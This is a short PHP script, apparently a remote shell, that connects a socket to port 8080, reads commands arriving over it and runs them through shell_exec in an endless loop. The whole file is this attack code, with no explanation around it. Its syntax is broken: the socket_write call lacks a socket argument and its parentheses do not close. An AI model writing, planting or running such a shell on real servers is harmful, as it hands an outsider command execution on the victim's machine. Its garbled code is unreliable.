<?php
$sock=socket_create (AF_INET,SOCK_STREAM);socket_connect ($sock,"0.0.0.0",8080);
while (1){

   socket_write (
         shell_exec(socket_read ($sock,1024));
}
?>
